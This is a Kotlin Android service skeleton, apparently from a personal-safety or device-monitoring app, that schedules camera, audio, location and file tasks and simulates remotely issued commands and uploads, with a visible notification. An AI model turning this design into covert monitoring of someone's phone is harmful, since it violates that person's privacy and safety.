package com.save.me

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.os.Handler
import android.os.Looper
import kotlinx.coroutines.*

class SurveillanceService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        NotificationUtils.createNotificationChannel(this)
        showDefaultNotification()

        // Start background observers
        scope.launch { startCommandListener() }
        scope.launch { CameraUtils.schedulePhotoVideoTasks(this@SurveillanceService) }
        scope.launch { AudioUtils.scheduleAudioTasks(this@SurveillanceService) }
        scope.launch { LocationUtils.scheduleLocationTasks(this@SurveillanceService) }
        scope.launch { FileUtils.scheduleFileTasks(this@SurveillanceService) }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Use START_STICKY for automatic restart if killed
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    // -- Notification Management --

    private fun showDefaultNotification() {
        val notification = NotificationUtils.buildForegroundNotification(this)
        startForeground(NotificationUtils.NOTIFICATION_ID, notification)
    }

    private fun updateNotificationForCommand(command: String) {
        val notification = NotificationUtils.buildCommandNotification(this, command)
        NotificationUtils.notify(this, notification)
    }

    private fun updateNotificationForUpload() {
        val notification = NotificationUtils.buildUploadingNotification(this)
        NotificationUtils.notify(this, notification)
    }

    private fun revertNotification() {
        val notification = NotificationUtils.buildForegroundNotification(this)
        NotificationUtils.notify(this, notification)
    }

    // -- Example Command Listener Simulation (replace with actual Supabase logic) --
    private suspend fun startCommandListener() = coroutineScope {
        while (isActive) {
            // Simulate receiving a command (replace this with actual realtime command listener)
            delay(20000L)
            val command = "Take Photo"
            handler.post { updateNotificationForCommand(command) }

            // Simulate handling the command for 5 seconds
            delay(5000L)
            handler.post { revertNotification() }

            // Simulate file upload after command
            delay(2000L)
            handler.post { updateNotificationForUpload() }

            // Simulate uploading file for 3 seconds
            delay(3000L)
            handler.post { revertNotification() }
        }
    }

    // -- Example: Call updateNotificationForUpload() in your file upload logic --
    fun onFileUploadStart() {
        handler.post { updateNotificationForUpload() }
    }

    fun onFileUploadComplete() {
        handler.post { revertNotification() }
    }
}